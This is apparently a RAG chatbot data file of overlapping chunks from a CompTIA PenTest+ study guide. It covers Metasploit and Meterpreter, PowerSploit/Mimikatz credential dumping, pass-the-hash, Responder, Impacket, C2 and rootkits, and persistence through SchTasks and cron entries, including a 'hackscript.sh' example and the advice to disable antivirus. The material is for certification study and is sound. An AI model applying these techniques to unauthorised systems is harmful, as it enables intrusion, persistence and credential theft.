Tab completion works in Metasploit, so take advantage of it to make selection of modules easier. Selecting a Payload A payload in Metasploit is one of three types of exploit modules: a single, a stager, or a stage. Singles are self‐contained payloads, which will often do something simple like add a user or run a command, and they are the simplest payloads to deploy. Stagers set up a network connection between the target and a host. Stagers use stages, which are payloads that they download to pull in bigger, more complex tools. In addition to the three types of exploit modules, there are eight types of payloads: Inline payloads are single payloads and include the exploit and payload in a single package. Staged payloads work well for memory‐restricted environments and load the rest of the payload after landing. Meterpreter is a powerful payload that works via DLL injection on Windows systems and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or run a command, and they are the simplest payloads to deploy. Stagers set up a network connection between the target and a host. Stagers use stages, which are payloads that they download to pull in bigger, more complex tools. In addition to the three types of exploit modules, there are eight types of payloads: Inline payloads are single payloads and include the exploit and payload in a single package. Staged payloads work well for memory‐restricted environments and load the rest of the payload after landing. Meterpreter is a powerful payload that works via DLL injection on Windows systems and remains memory resident. PassiveX uses ActiveX via Internet Explorer and is becoming largely deprecated, although occasional systems may still be vulnerable to it. NoNX payloads are designed to counter modern memory protection like Data Execution Prevention (DEP) or Windows No Execute (NX). ORD (ordinal) load a DLL into a compromised process on a Windows system. IPv6 payloads are designed for IPv6 networks. Reflective DLL injection modules also target Windows systems and run in memory only. The default payload for this package is the Metasploit Meterpreter, so all we need to do is run the exploit to get Meterpreter in place. To see the full list of Metasploit payloads, you can use the show payloads command at the msf> prompt before selecting an exploit to display screen after screen of payloads designed for Windows, Unix/Linux, and other operating systems. Module Options Many Metasploit modules have options that you can set. For our module to work properly, we need to check the options and set them (Figure 6.9). FIGURE 6.9 Setting module options This module includes an rhost setting, which is our remote target host. In some cases, you may need to set the rport setting, particularly if your target is running the vulnerable service on a nonstandard port. Finally, some modules may need a target ID set. In this case, since it is a Windows‐ specific exploit, the exploit module in use only sets a single target ID for Windows rather than offering options. Exploitation With an exploit and payload selected, you can attempt the exploit using the exploit command, as shown in Figure 6.10. Note that this exploit uses Meterpreter as its default payload and that we now have a powerful exploit package to use—and that Meterpreter cleaned up after itself by removing the Meterpreter upload. Since Meterpreter runs in memory, there will be no evidence of the exploit in the target service directory! You can read more about Meterpreter at https://www.offsec.com/metasploit-unleashed. FIGURE 6.10 Successful exploit Once connected, Meterpreter offers the ability to attempt to escalate privileges with the getsystem command. If that fails, shell access is available by simply typing shell , which drops you to a shell in the directory that the exploited service runs in, C:\ManageEngine\DesktopCentral_Server\Bin, allowing you to take further actions from there. PowerSploit PowerSploit is a set of Windows PowerShell scripts that are designed to provide capabilities, including antivirus bypass, code execution, exfiltration, persistence, reverse
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	memory, there will be no evidence of the exploit in the target service directory! You can read more about Meterpreter at https://www.offsec.com/metasploit-unleashed. FIGURE 6.10 Successful exploit Once connected, Meterpreter offers the ability to attempt to escalate privileges with the getsystem command. If that fails, shell access is available by simply typing shell , which drops you to a shell in the directory that the exploited service runs in, C:\ManageEngine\DesktopCentral_Server\Bin, allowing you to take further actions from there. PowerSploit PowerSploit is a set of Windows PowerShell scripts that are designed to provide capabilities, including antivirus bypass, code execution, exfiltration, persistence, reverse engineering, and reconnaissance. Much like Metasploit, PowerSploit is a very powerful, flexible tool. Like many of the tools pentesters use, PowerSploit will be picked up by Windows Defender and other antimalware tools as soon as you download it. Turn off your antivirus if you want to avoid this—and remember to keep the system you use secure! Fortunately for our purposes, Kali Linux also includes PowerSploit in the Applications ➢ Post Exploitation menu. This will drop you to a terminal window in /usr/share/PowerSploit. From there, you can run a simple Python web server to exposePowerSploit tools to Windows systems by typing python ‐m SimpleHTTPServer , and then use an existing Meterpreter session on the remote Windows system to use PowerSploit tools. If you have administrative access to a remote Windows workstation or server, PowerSploit can provide the toolkit you need to maintain persistence and to perform further reconnaissance. One of the most popular tools to use with PowerSploit is the implementation of Mimikatz functionality that it includes as part of the Invoke‐Mimikatz PowerShell script. This script injects Mimikatz into memory and then allows you to dump credentials without having Mimikatz on disk, where it could be discovered by antivirus that is monitoring disk activity. Once you have this functionality in memory, you can use typical Mimikatz functions like LSASS (Local Security Authority Subsystem Service) credential dumping, private certificate acquisition, and even acquisition of debug credentials. We will take a closer look at Mimikatz later in this chapter. The PenTest+ exam objectives also specifically call out Empire, a PowerShell‐ and Python‐based post‐exploitation tool. Empire uses encrypted communications and allows PowerShell agents to run without powershell.exe, and it has quite a few modules designed to help with post‐exploitation activities on Windows systems. You can read more about Empire at www.powershellempire.com and on the Empire wiki at https://github.com/EmpireProject/Empire/wiki/Quickstart. Since we already cover PowerSploit in this chapter, we won't dig further into Empire—but you should be aware that it is another tool with similar functionality and a Metasploit‐like interface. BloodHound BloodHound is a tool used to visualize Active Directory objects and permissions. It can't be used by itself—in fact, you need to have a way to acquire Active Directory information, and then you can feed that information into BloodHound to allow you to analyze the data more easily. That's where SharpHound comes in. SharpHound requires you to be a domain member to run it, and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Empire wiki at https://github.com/EmpireProject/Empire/wiki/Quickstart. Since we already cover PowerSploit in this chapter, we won't dig further into Empire—but you should be aware that it is another tool with similar functionality and a Metasploit‐like interface. BloodHound BloodHound is a tool used to visualize Active Directory objects and permissions. It can't be used by itself—in fact, you need to have a way to acquire Active Directory information, and then you can feed that information into BloodHound to allow you to analyze the data more easily. That's where SharpHound comes in. SharpHound requires you to be a domain member to run it, and it will then enumerate the AD domain. Once you have data fed into BloodHound, you can use it to analyze the data, including finding data like a list of domain administrators which are common attack targets. That means that if you're intending to use a tool like PowerSploit or Empire, you may want to perform analysis using BloodHound first to provide a useful target list. If you want to give BloodHound a try, you can find a walk‐through for setup at http://www.pentestpartners.com/security-blog/bloodhoundwalkthrough-a-tool-for-many-tradecrafts or at http://www.ired.team/offensive-security-experiments/active-directorykerberos-abuse/abusing-active-directory-with-bloodhound-on-kalilinux. Other Methods of Access Once you have gained access to systems, either through capturing credentials, using credential dumping techniques, or other methods, you can conduct ongoing attacks. Not only does this allow you to pivot, but you can also create persistence. Other methods include exploiting daemons and services, using Registry keys, tamerping with security controls, leveraging exploited browsers and the myriads of extensions, and many others. For the PenTest+ exam, it's common to be given scenarios where exploiting services and utilizing Trojans, such as a rootkit, will be used as a tool to gain access to a system and further exploit it. Daemons and Services Installing a fake service or inserting malicious code into an existing service in memory via a tool like Meterpreter can allow ongoing access to a system. Installing a daemon or service will provide longer access than code injected into memory, which won't survive reboots, but injected code is typically harder to detect. Command and Control (C2) Frameworks Installing C2 frameworks is another method of gaining and keeping access to systems. Many times, they go undetected and allow attackers to keep persistence but also launch other attacks while the C2 is maintained. C2 stands for command and control, and it's called that because there is generally a controlled system (the system that is breached) and the control system, which is generally the attacker's system. The framework is actually quite elaborate in that once the breached system is controlled, various other things will take place, such as channel exploitation, remote control, file transfer, and injection. Rootkit Rootkits are like C2 frameworks but are a lot less elaborate. Think of the C2 as a Lamborghini and a rootkit like a Hyundai. Rootkit's primary objective is to give the attacker “root” privilege to a system, thus giving them full control and access. Generally, it's ingested into the system as a Trojan horse where you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that is breached) and the control system, which is generally the attacker's system. The framework is actually quite elaborate in that once the breached system is controlled, various other things will take place, such as channel exploitation, remote control, file transfer, and injection. Rootkit Rootkits are like C2 frameworks but are a lot less elaborate. Think of the C2 as a Lamborghini and a rootkit like a Hyundai. Rootkit's primary objective is to give the attacker “root” privilege to a system, thus giving them full control and access. Generally, it's ingested into the system as a Trojan horse where you install something, and it's actually a rootkit, which the attacker can then use to administratively control the system. LOLBins A commonly used tool to conduct attacks is a LOLBin. LOLBins stand for Living Off the Land Binaries and are pieces of software that exist in an operating system and usually remain undetected. These binaries are often not meant to be harmful or malicious but are used by attackers in a way that makes them a concern. For example, Windows, PowerShell, and WMI (Windows Management Instrumentation) are highly compromised services that serve as a LOLBin. Another great example of a LOLBin is Windows Remote Management (WinRM) in the form of winrm.vbs, which can be used for lateral movement attacks. As mentioned, WinRM is a system tool, but once compromised, it becomes a LOLBin. Since a script form of the tool was used versus the direct binary, this is referred to as a LOLBAS, which stands for Living Off the Land Binaries and Scripts. Command‐Line Tools Many tools come with operating systems that can be leveraged for not only information gathering, but also direct attacks, lateral movement, and persistence. When working with Windows, you can use a myriad of tools that can even be baked into scripts to conduct these actions. Before getting into the tools that can be used, you should know that there are two common ways to access and use them: PowerShell or the command shell. Much like a Linux shell, these Windows shells allow you direct access to interface with the OS and conduct actions. When using a system like Windows or Linux, there is often a graphical user interface (GUI) allowing you easier access to interface with the underlying system. The shells provide access directly to the OS, but you must rely on entering the commands yourself. Another valuable feature of the shells and command‐ line tools is the ability to script functions and automate tasks. cmd.exe When using Windows, you can use the search bar on most common builds of the OS and type cmd and press Enter. This will open a standard command prompt up for you to use. This provides you with access to enter commands, create scripts, and automate functions. One important point to mention is that this is generally opened as a non‐administrative shell, so you would need to open a command prompt in administrator mode to gain full access to all
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Another valuable feature of the shells and command‐ line tools is the ability to script functions and automate tasks. cmd.exe When using Windows, you can use the search bar on most common builds of the OS and type cmd and press Enter. This will open a standard command prompt up for you to use. This provides you with access to enter commands, create scripts, and automate functions. One important point to mention is that this is generally opened as a non‐administrative shell, so you would need to open a command prompt in administrator mode to gain full access to all the tools and their abilities. To open a command prompt in administrator mode, right‐click the icon in the search bar results and choose Run As Administrator. net Commands Once you have access to the command prompt, you can use net commands. These commands allow you to perform administrative tasks on the computer. Common tools are seen in Figure 6.11, and you can list them by typing net at the command prompt and pressing Enter. FIGURE 6.11 Using the command prompt These tools are extremely helpful in gathering information, conducting exploits, and performing penetration testing. For example, you can use net start and net stop to control services. You can also use net use to conduct attacks. For example, network share discovery can take place with the net view and net share commands. As noted in a MITRE attack, you can use the net view \remotesystem and net share commands. The net commands can be used to find shared drives and directories on remote and local systems, respectively. You can view this attack on the MITRE ATT&CK site at https://attack.mitre.org/software/S0039. explore.exe The Windows GUI or Window Explorer can be controlled via the explore.exe command. This is also known as the File Explorer, and it helps to create the desktop environment we are all accustomed to seeing. This file or executable has also been the subject of a great many attacks and more often as a target of malware. Once infected with malware, explore.exe can wreak havoc for a compromised system. ftp.exe There is a File Transfer Protocol (FTP) tool on Windows systems called ftp.exe, which when run from the command prompt, can provide you with a lean client you can use to conduct file transfers to other systems via the command line. If accessed maliciously, it can be used to transfer data to and from other systems. mmc.exe The Microsoft Management Console (MMC) is a tool that allows a user to add snap‐ins to manage a Windows system. It is accessed by typing mmc into a search bar on a Windows machine, and it produces an empty console. Those who use and administer Windows systems have seen this console before. However, to gain access to a system and utilize this tool, you can build your own to host whatever toolsets you want from within. To add toolsets, choose File ➢ Add/Remove Snap‐In. Once you access the toolsets, add whichever you like
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	data to and from other systems. mmc.exe The Microsoft Management Console (MMC) is a tool that allows a user to add snap‐ins to manage a Windows system. It is accessed by typing mmc into a search bar on a Windows machine, and it produces an empty console. Those who use and administer Windows systems have seen this console before. However, to gain access to a system and utilize this tool, you can build your own to host whatever toolsets you want from within. To add toolsets, choose File ➢ Add/Remove Snap‐In. Once you access the toolsets, add whichever you like or need to conduct administrative functions to the system, including but not limited to services such as certificate management, log management, WMI controls, and so much more. If the MMC is accessed by the wrong users, they can access the entire system and administer just about any part of it within the console they build. rundll The rundll command (or better, the rundll32 command) is used to load and run 32‐bit dynamic‐link libraries (DLLs). These libraries are often the backbone of many programs, applications, and system services within the operating system. This is also a very commonly exploited function to create a proxy for executing malware. msbuild msbuild.exe is a Visual Studio and Microsoft .NET Framework tool that allows users to “test” builds of software functionality once created. Although not malicious, it's often compromised due to its ability to query software. The MSBuild tool can be used as a proxy to execute malware or malicious code through the utility. It's often recommended that you remove it if you are not using it because msbuild.exe can lead to various attacks. Learn more at the MITRE ATT&CK site at https://attack.mitre.org/techniques/T1127/001. route Another commonly used command‐line tool that can be used for pivoting and lateral movement is route. To use it correctly, you will need to use the command route print to show the routes that are used within the system. To understand how to use this tool, you will need to understand how a routed network functions. When a Windows machine is connected to a network, it is considered an endpoint. This endpoint will have an IP address and be connected to an IP‐based network that is connected to other various networks; ultimately, it's connected to an exit network such as the Internet. The IP‐based network will be constructed of routers that will have routes in them so that they know where to send source and destination traffic. For example, if you wanted to access a website on the Internet, the request must be sent to a default gateway router, which will continue to send your request directly to each connected router to get you to the website on the Internet. When an attacker exploits a system and can access the route table on the computer, it can get the IP address of the default gateway, which is often a router. If they can penetrate that router, they can gain access to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	will have routes in them so that they know where to send source and destination traffic. For example, if you wanted to access a website on the Internet, the request must be sent to a default gateway router, which will continue to send your request directly to each connected router to get you to the website on the Internet. When an attacker exploits a system and can access the route table on the computer, it can get the IP address of the default gateway, which is often a router. If they can penetrate that router, they can gain access to the routes within it and find other routes and routers that they can use. netstat netstat is a Windows command‐line utility that allows you to view active connections or established connections within your system. So, if you are connected to a network and accessing the Internet, you can run the netstat command and view the results while browsing the Internet. You will see how your connections show up in the command‐line tool, displaying information such as the local (or source) address, which computer you are using, as well as what port is being used, and the destination (foreign) address that you are connecting to along with the port being used. The IP address and port combination seen in this command when fused together is called a socket connection and is seen as 192.168.1.2:49411, which means the IP plus a colon and the port will equal the socket connection number scheme. What is important to know about this is that if compromised, this gives attackers a bird's‐eye view into what the system is accessing. If it is accessing internal systems via port connections, the entire socket connection can be leveraged to conduct an attack against a target system. It can also help to create a pivot or lateral move. Strings Strings in the context or applications and programming are sequences of information meant to represent some form of outcome. That means, if you wanted to create a string of data, it may map to files, code, symbols, or various other formats. When it comes to security, accessing this data and manipulating it can provide positive outcomes for those who are able to exploit it. Often, strings allow for pattern‐matching models and, if accessed, can provide useful data. findstr.exe findstr.exe is a Microsoft utility that allows you to search strings for data. It can search for strings of text found within various files. Because of this, if exploited, this utility can be used to search for patterns of data that may be valuable. Covenant Covenant is a C2 tool (which I covered earlier) that allows you to access and control a system. It's an outdated tool but still highly relevant in the realm of conducting tests. When it comes to strings, Covenant happens to do a good job with allowing for string customization. It can be used to do replacements. CrackMapExec CrackMapExec (also known as CME) is a tool that is often
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	It can search for strings of text found within various files. Because of this, if exploited, this utility can be used to search for patterns of data that may be valuable. Covenant Covenant is a C2 tool (which I covered earlier) that allows you to access and control a system. It's an outdated tool but still highly relevant in the realm of conducting tests. When it comes to strings, Covenant happens to do a good job with allowing for string customization. It can be used to do replacements. CrackMapExec CrackMapExec (also known as CME) is a tool that is often used in Microsoft Windows and with Active Directory Services (ADS). It's a Swiss army knife of AD tools that allows you to execute scripts, memory injection, enumeration, and dumping of credentials. sshuttle sshuttle is a Linux‐ and macOS‐based tool you can use to create a VPN connection using Secure Shell (SSH). It can create a routing function on the host system that allows you to forward traffic. It allows you to pivot from the victimized system you have access to. ProxyChains Proxy‐based apps allow you to forward data using anonymity. This is very helpful when you want to conceal your tracks or pivot without being identified. ProxyChains is a tool that allows you to create that proxy function while sending traffic. ProxyChains specifically will force any TCP connection that is made to forward through the proxy. PowerShell ISE PowerShell ISE is an enhanced version that uses an integrated scripting environment (ISE). Because of this additional functionality, it's a treasure trove for those who can use it. Using ISE allows you to take advantage of enhanced features to write and test scripts, debug them, and run commands. While both versions of PowerShell can be used similarly, ISE can be more flexible. Batch Files Batch files are files written in script using a series of commands commonly written using the Windows command prompt or by using older versions such as DOS 6.22. While less likely to be used these days, these files still pop up from time to time and should be considered. If you want to learn more about these tools and gain access to them, you can access many of them via GitHub. For example, if you wanted to use sshuttle or Covenant, use the links provided here: https://github.com/sshuttle/sshuttle or https://github.com/0x31i/c2pivot. Exploit Specifics The PenTest+ exam objectives specifically mention a number of exploits that you should be prepared to encounter on the exam but also leave out a number of common exploit targets. We've covered both here to ensure that you are aware of some of the most important exploit targets you are likely to encounter during your penetration testing efforts. This section also focuses on service discovery as you conduct your pentesting process. RPC/DCOM Historically, RPC/DCOM (Remote Procedure Call/Distributed Component Object Model) exploits were a common way to attack Windows NT, 2000, XP, and 2003 Server systems, and even modern attack tools often have RPC/DCOM exploits available. More modern
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	number of exploits that you should be prepared to encounter on the exam but also leave out a number of common exploit targets. We've covered both here to ensure that you are aware of some of the most important exploit targets you are likely to encounter during your penetration testing efforts. This section also focuses on service discovery as you conduct your pentesting process. RPC/DCOM Historically, RPC/DCOM (Remote Procedure Call/Distributed Component Object Model) exploits were a common way to attack Windows NT, 2000, XP, and 2003 Server systems, and even modern attack tools often have RPC/DCOM exploits available. More modern exploits tend to focus on other elements, such as the .NET interoperability layers for DCOM. Although occasionally RPC/DCOM vulnerabilities continue to appear, and exploits are often written for them, RPC/DCOM exploits are far less common today. PsExec The Sysinternals Windows toolkit includes PsExec, a tool designed to allow administrators to run programs on remote systems via SMB on port 445. That makes it an incredibly useful tool if it is available to you during a penetration test, because you can execute arbitrary commands, up to and including running an interactive shell. Unfortunately for modern attackers, this tool has been abused so much over time that most antimalware tools will flag PsExec the moment it lands on a system. A number of Metasploit exploit modules also reference PsExec, which isn't actually the Microsoft Sysinternals tool. Instead, the Metasploit PsExec exploit embeds a payload into a service executable, connects to the ADMIN$ share, uses the Service Control Manager to start the service, loads the code into memory and runs it, and then connects back to the Metasploit machine and cleans up after itself! PS Remoting/WinRM Windows systems running Windows 7 or later use Windows Remote Management (WinRM) to support remote PowerShell command execution. For a pentester, being able to run PowerShell commands on remote systems is very handy, but this feature has to be turned on first. Fortunately, doing so is simple. Remote PowerShell command execution can be turned on using the enable‐PSRemoting ‐force command while running PowerShell as an administrator. If the systems aren't part of the same domain, you will still have to set up trust between them using the TrustedHosts setting: Set-Item wsman:\localhost\client\trustedhosts [ipaddress or hostname] Once you have done this, you have to restart WinRM, and then you can run remote PowerShell commands at will. For a pentester, this can make further exploits and retaining access even easier, as long as it remains undetected. WMI Windows Management Instrumentation (WMI) allows for remote management and data gathering installed on all Windows systems, making it an attractive target for pentesters and attackers. WMI provides access to a huge variety of information, ranging from Windows Defender information to SNMP to application inventory listings. WMI can allow remote execution of commands, file transfers, and data gathering from files and the Registry, among many other capabilities. Multiple PowerShell tools have been written to exploit WMI, including WMImplant and WmiSploit. WMImplant has a number
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	this can make further exploits and retaining access even easier, as long as it remains undetected. WMI Windows Management Instrumentation (WMI) allows for remote management and data gathering installed on all Windows systems, making it an attractive target for pentesters and attackers. WMI provides access to a huge variety of information, ranging from Windows Defender information to SNMP to application inventory listings. WMI can allow remote execution of commands, file transfers, and data gathering from files and the Registry, among many other capabilities. Multiple PowerShell tools have been written to exploit WMI, including WMImplant and WmiSploit. WMImplant has a number of useful functions for lateral movement, including information gathering using basic_info, and checks to see if there is a logged‐in user via vacant_system, as shown in Figure 6.12. FIGURE 6.12 WMImplant WMI tools The best way to learn more about WMI tools like these is to install them on a test host like the Metasploitable 3 virtual machine and then use them to gather information about the host and other systems. Fileless Malware and Living Off the Land Malware and penetration testing tools that leave files on systems leave them open to detection by scanners and other tools. In cases where pentesters want to avoid leaving indicators of compromise, fileless malware can be used. Memory‐resident tools insert themselves into legitimate processes to hide from antimalware tools while allowing attackers to take actions like those processes would. Common fileless malware targets for Windows include PowerShell, Windows Management Instrumentation (WMI), and the .NET Framework, but there are dozens of programs, operating system components, and utilities that may be targeted. Once pentesters have successfully used fileless malware to gain access to a system, the next step in avoiding leaving tools and other files behind is known as living off the land. In this mode you will only use existing tools that are on the system. Those may include Linux utilities, built‐in Windows commands and PowerShell features, or any other accessible tools or programs on the target system. Tools like CrackMapExec, shown in Figure 6.13, can be particularly helpful when using living‐off‐the‐land attacks. It uses native tools for Active Directory–enabled systems to conduct attacks and supports pass‐the‐hash, null session, and other techniques in a single unified shell. FIGURE 6.13 CrackMapExec's main screen The Pentest+ exam doesn't require you to know specific tools, but it does list some by name. CrackMapExec is one of those tools. You can read more about it, including details of how it is used, at https://github.com/byt3bl33d3r/CrackMapExec/wiki. Using fileless malware has its own set of disadvantages. If the system is rebooted, you will have to repeat the compromise process. You also have to be very careful about avoiding the creation of local artifacts of your attack —information gathered can leave fingerprints, too. Scheduled Tasks and cron Jobs Using scheduled tasks to perform actions on a compromised Windows host is a tried‐and‐true method of retaining access. The same is true of cron jobs on Linux and Unix hosts, and this means that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	tools. You can read more about it, including details of how it is used, at https://github.com/byt3bl33d3r/CrackMapExec/wiki. Using fileless malware has its own set of disadvantages. If the system is rebooted, you will have to repeat the compromise process. You also have to be very careful about avoiding the creation of local artifacts of your attack —information gathered can leave fingerprints, too. Scheduled Tasks and cron Jobs Using scheduled tasks to perform actions on a compromised Windows host is a tried‐and‐true method of retaining access. The same is true of cron jobs on Linux and Unix hosts, and this means that defenders will often monitor these locations for changes or check them early in an incident response process. That doesn't mean that the technique isn't useful—it merely means that it may be detected more easily than a more subtle method. But unlike memory‐resident exploits, both scheduled tasks and cron jobs can survive reboots. To schedule a task via the command line for Windows, you can use a command like this, which starts the calculator once a day at 8:00 a.m.: SchTasks /create /SC Daily /TN "Calculator" /TR "C:\Windows\System32\calc.exe" /ST 08:00 The same technique works with Linux or Unix systems using cron, although cron keeps multiple directories in /etc/ on most systems, including /etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, and /etc/cron.monthly. Scripts placed into these directories will be executed as you would expect based on the name of the directory, and the scripts can include a specific number of minutes after the hour, the 24‐hour military time, the day of the month, the month, the day of the week, and the command to run. Thus, 0 30 1 * * /home/hackeduser/hackscript.sh would run the first day of every month at 12:30 a.m. and would execute hackscript.sh in the /home/hackeduser directory. Of course, if you're trying to retain access to a system, you'll want to be a lot more subtle with filenames and locations! One of the most common uses of this type of scheduled task is to retain access to systems via a remotely initiated “call home” script. This prevents defenders from seeing a constant inbound or outbound connection and can be used to simply pick up files or commands from a system that you control on a regular basis. The PenTest+ test outline doesn't mention NFS (Network File System) shares, but NFS exploits are worth remembering while conducting a penetration test. Servers often use NFS mounts for shared filesystems or to access central storage, and improperly configured or secured NFS shares can provide useful information or access. If you find TCP ports 111 and 2049 open, you may have discovered an NFS server. SMB Server Message Block (SMB) is a file‐sharing protocol with multiple common implementations. Historically, Windows implemented it as CIFS (Common Internet File System), with modern systems using SMB2 or SMB3, and Linux using Samba. In each case, the underlying protocol is the same, with slight differences in implementation and capabilities. Since SMB provides name resolution, file services, authentication, authorization, and print
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	NFS mounts for shared filesystems or to access central storage, and improperly configured or secured NFS shares can provide useful information or access. If you find TCP ports 111 and 2049 open, you may have discovered an NFS server. SMB Server Message Block (SMB) is a file‐sharing protocol with multiple common implementations. Historically, Windows implemented it as CIFS (Common Internet File System), with modern systems using SMB2 or SMB3, and Linux using Samba. In each case, the underlying protocol is the same, with slight differences in implementation and capabilities. Since SMB provides name resolution, file services, authentication, authorization, and print services, it is an attractive target for pentesters who want access to remote systems that provide SMB services. If you discover SMB services, the variety of implementations makes identifying the host operating system and the SMB implementation important when attempting exploits. Gathering information from open shares and services doesn't require that knowledge. Kali Linux includes SMB Scanner, and Metasploit has SMB scanning capabilities built in that can do everything from brute‐force logins to enumerating SMB services. Credentials for SMB can be acquired by tools like Responder, which reply to queries for resources as shown in Figure 6.14. This exploits the trust in a service response to tell the client that the responder host is a legitimate service provider, causing it to send its hashed credentials, which the owner of the Responder host can then use to authenticate to legitimate servers. FIGURE 6.14 Responder capture flow Similar tools exist in Metasploit, which means that in many cases you can use a single tool to provide many of the functions you might otherwise need multiple specialized tools to accomplish. Once you have hashed credentials in hand, you can replay them to servers, in plain text, Kerberos, or NTLM modes, with tools like Impacket, Mimikatz, or Metasploit. The PenTest+ exam outline specifically mentions SecureAuth's Impacket Python–based toolset and libraries, which provides many functions besides simple SMB hash playback. In fact, it includes tools that create WMI persistence, dump secrets from remote machines with clients, handle MS‐ SQL authentication, and replicate PsExec services. Here are examples of core Impacket tools: psexec.py, which replicates the functionality of PsExec in Python wmiexec.py, which is a shell for use via WMI and which doesn't install a service or agent to run on a remote system smbclient.py, a Python SMB client reg.py, which allows Registry manipulation sniff.py and sniffer.py, lightweight Python packet sniffers; sniff.py uses the Python pcapy library, whereas sniffer.py uses raw sockets, allowing you to choose the best option for your needs There are dozens of other tools, including exploits and specialized tools, that can be very helpful to a pentester. Much like other tools specifically mentioned in the PenTest+ exam outline, you should have a general idea of what Impacket is—a set of Python‐based tools and utilities—and when you might use it during a penetration test. SecureAuth breaks down all of the Impacket tools and their uses at https://www.secureauth.com/labs/open-source-tools/impacket. Pass‐the‐hash attacks like those shown in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	sniffer.py, lightweight Python packet sniffers; sniff.py uses the Python pcapy library, whereas sniffer.py uses raw sockets, allowing you to choose the best option for your needs There are dozens of other tools, including exploits and specialized tools, that can be very helpful to a pentester. Much like other tools specifically mentioned in the PenTest+ exam outline, you should have a general idea of what Impacket is—a set of Python‐based tools and utilities—and when you might use it during a penetration test. SecureAuth breaks down all of the Impacket tools and their uses at https://www.secureauth.com/labs/open-source-tools/impacket. Pass‐the‐hash attacks like those shown in Figure 6.15 are relatively simple in concept: A pentester uses existing access to a Windows system and captures active hashes from authenticated sessions from LSASS.exe or other targets like NTDS.dit. If successful, they then use a tool like Mimikatz's pass‐the‐hash functionality while specifying the user's username, domain (or local account), and the password hash. They can then use other tools to run commands remotely on the targeted system, continuing the penetration testing effort and expanding access as they move forward. FIGURE 6.15 Pass‐the‐hash flow DNS DNS attacks can occur at the server or the host level. The simplest attacks in many cases add arbitrary hosts to a system's hosts files, directing traffic to a chosen destination without the host ever querying an upstream DNS server. More complex attacks include malicious changes of DNS information, whether via changing configurations on hosts, responding to DHCP requests, or targeting and taking over legitimate DNS servers. The PenTest+ exam outline specifically points to mitm6, a tool that is used to exploit a Windows DNS server by replying to DHCPv6 messages and giving them a link‐local IPv6 address paired with a system controlled by the attacker as the default DNS server. Once this occurs, the attacker can perform on‐path (adversary‐in‐the‐middle) attacks by directing targets to arbitrary destinations of their choice. You can read more about the tool at https://github.com/fox-it/mitm6. LDAP When looking at inherent weaknesses in Lightweight Directory Access Protocol (LDAP), one of the most likely attack scenarios is LDAP injection attacks. First, you need to understand the common use of LDAP—that it is a protocol used to help manage and use directory services such as Active Directory (AD). LDAP allows for the access, manipulation, management, configuration, and searching of directory records. As you may imagine, if malicious intent mixed with access to a directory service is merged, you likely will have a problem with information getting into the wrong hands. Directory services generally house a large amount of information that can be used for wrongdoing. A common attack used against directories is LDAP injection, where a malicious user can input data and inject it into a directory. Another obvious attack is accessing the directory and using the learned information to map a network or infrastructure so that you can pivot and laterally move about within it. File Transfer Protocol (FTP) File Transfer Protocol (FTP) attacks are another method of attack where when using a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	service is merged, you likely will have a problem with information getting into the wrong hands. Directory services generally house a large amount of information that can be used for wrongdoing. A common attack used against directories is LDAP injection, where a malicious user can input data and inject it into a directory. Another obvious attack is accessing the directory and using the learned information to map a network or infrastructure so that you can pivot and laterally move about within it. File Transfer Protocol (FTP) File Transfer Protocol (FTP) attacks are another method of attack where when using a system's FTP service, you can send and receive data to and from the source to the back to the destination. This allows you to exfil data, or in some cases, important malware. The PenTest+ exam outline specifically points out FTP and its use when given a specific scenario on how you may use C2 frameworks and leverage FTP as a way of importing or moving data. Telnet Telnet is rarely used or seen in today's networks, but there are still those who continue to use it against better judgment. Telnet is a protocol (and a tool) that allows you to remotely access and administer a system. It's deeply flawed in that if an on‐path attack was being conducted, any credentials sent to and from a system—or anything sent at all for that matter—can be captured and used or replayed. It's been replaced by tools such as Secure Shell (SSH) that provide encryption and additional layers of security. HTTP/HTTPS One of the most often seen and used protocols in existence today is HTTP and HTTPS. Hypertext Transfer Protocol (HTTP) is the nonsecure version and Hypertext Transfer Protocol Secure (HTTPS) is the secure version of the protocols used by just about every web browser, server, app, service, and function today. The PenTest+ exam outline specifically points to the use of web interfaces that map directly to an incredibly long list of attacks that can be conducted. For example, clickjacking is an attack that can trick the user into clicking on a link, image, or other function on a web page and then produces a malicious action such as installing malware. Another web interface attack such as SQL injection uses HTTP to expose weaknesses in SQL databases. Make sure you are aware of how weaknesses in HTTP/HTTPS can lead to exploitation and attack. Line Printer Daemon (LPD) Line Printer Daemon (LPD) is an older protocol service that allows for network printing between users, printer servers, physical printers, and the jobs that are sent to be printed. All of this used together allows for printing to take place, and LPD is often the protocol that allows for this functionality. LPD attacks can take place when an attacker exploits the vulnerabilities found in the LPD service. Various attack types can take place, including buffer overflows, where if enough data is sent to a print server for printing, it can lead to expose vulnerabilities and create
